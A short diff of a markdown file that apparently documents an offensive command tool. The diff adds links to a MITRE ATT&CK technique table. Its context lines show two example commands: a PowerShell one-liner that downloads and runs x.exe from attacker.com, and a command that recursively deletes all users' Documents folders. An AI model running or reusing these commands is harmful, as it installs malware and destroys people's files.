@@ -66,14 +66,15 @@ exec:powershell -c "iwr -uri http://attacker.com/x.exe -OutFile x.exe; ./x.exe"
 exec:del /S /Q C:\Users\*\Documents
 ```
 ---
-MITRE ATT&CK Mapping
+## MITRE ATT&CK Mapping (with Links)
 
 | Technique              | ID         |
 |------------------------|------------|
-| Command Execution      | T1059      |
-| Data from Local File   | T1005      |
-| Obfuscated Files       | T1027      |
-| Startup Persistence    | T1547.001  |
+| Command Execution      | [T1059](https://attack.mitre.org/techniques/T1059/)      |
+| Data from Local File   | [T1005](https://attack.mitre.org/techniques/T1005/)      |
+| Obfuscated Files       | [T1027](https://attack.mitre.org/techniques/T1027/)      |
+| Startup Persistence    | [T1547.001](https://attack.mitre.org/techniques/T1547/001/)  |
+
 ---
  **Legal Disclaimer**
 
